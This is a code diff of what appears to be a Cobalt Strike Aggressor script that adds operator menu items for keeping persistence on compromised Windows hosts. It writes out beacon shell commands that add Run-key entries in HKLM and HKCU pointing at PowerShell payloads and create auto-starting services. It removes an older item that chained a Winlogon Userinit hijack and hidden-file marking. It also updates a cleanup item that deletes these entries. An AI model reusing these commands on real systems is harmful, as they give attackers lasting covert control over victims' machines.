@@ -9,6 +9,16 @@
             });
         }
     }
+
+	item "Set PowerShell" {
+	local('$bid');
+	foreach $bid ($1){
+            prompt_text("Powershell (use \\ before \")", $filePath2, {
+                $filePath2 = $1;
+                return $filePath2;
+            });
+        }
+    }
     	item "Set mshta" {
 	local('$bid');
 	foreach $bid ($1){
@@ -28,7 +38,7 @@
         local('$bid');
         foreach $bid ($1){
             bshell($1, "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Bobo /t REG_SZ /d \"$filePath\" /f");
-	    bshell($1, "reg add HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"$filePath\" /f");
+	    bshell($1, "reg add HKEY_CURRENT_USER\\Environment /v BoboE /t REG_SZ /d \"$filePath\" /f");
         }
 	}
     item "SC_Autorun"{
@@ -38,6 +48,24 @@
 
         }
         }
+    item "SC_Autorun By PowerShell"{
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "sc create \"boboSC\" binpath= \"cmd /c $filePath2\"&&sc config \"boboSC\" start= auto&&net start boboSC");
+        }
+        }
+    item "RegHKLM By PowerShell"{
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v boboHKLM /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\$filePath2\" /f");
+        }
+	}
+    item "RegHKCU By PowerShell"{
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v boboHKCU /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\$filePath2\" /f");
+        }
+	}
     item "Reg_Autorun By mshta"{
         local('$bid');
         foreach $bid ($1){
@@ -50,24 +78,17 @@
             bshell($1, "sc create \"Bobo2\" binpath= \"cmd /c $filePath3\"&&sc config \"Bobo2\" start= auto&&net start Bobo2");
         }
         }
-       item "Lazy_Man" {
-        local('$bid');
-        foreach $bid ($1){
-            bshell($1, "attrib \"$filePath\" +s +h");
-            bshell($1, "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Bobo /t REG_SZ /d \"$filePath\" /f");
-	    bshell($1, "reg add HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"$filePath\" /f");
-            bshell($1, "sc create \"Bobo\" binpath= \"cmd /c start \"$filePath\"\"&&sc config \"Bobo\" start= auto&&net start Bobo");
-	    bshell($1, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,C:\\Windows\\System32\\$filePath3\" /f");
-	    bshell($1, "sc create \"Bobo2\" binpath= \"cmd /c $filePath3\"&&sc config \"Bobo2\" start= auto&&net start Bobo2");
-        }
-        }
-	item "Fuck_Lazy" {
+
+	item "Fuck_My_AutoRun" {
         local('$bid');
         foreach $bid ($1){
             bshell($1, "attrib \"$filePath\" -s -h");
             bshell($1, "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Bobo /f");
-	    bshell($1, "reg delete HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /f");
+	    bshell($1, "reg delete HKEY_CURRENT_USER\\Environment /v BoboE /f");
+            bshell($1, "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v boboHKLM /f");
+	    bshell($1, "reg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v boboHKCU /f");
             bshell($1, "sc delete \"Bobo\"");
+	    bshell($1, "sc delete \"BoboSC\"");
 	    bshell($1, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,\" /f");
 	    bshell($1, "sc delete \"Bobo2\"");
         }
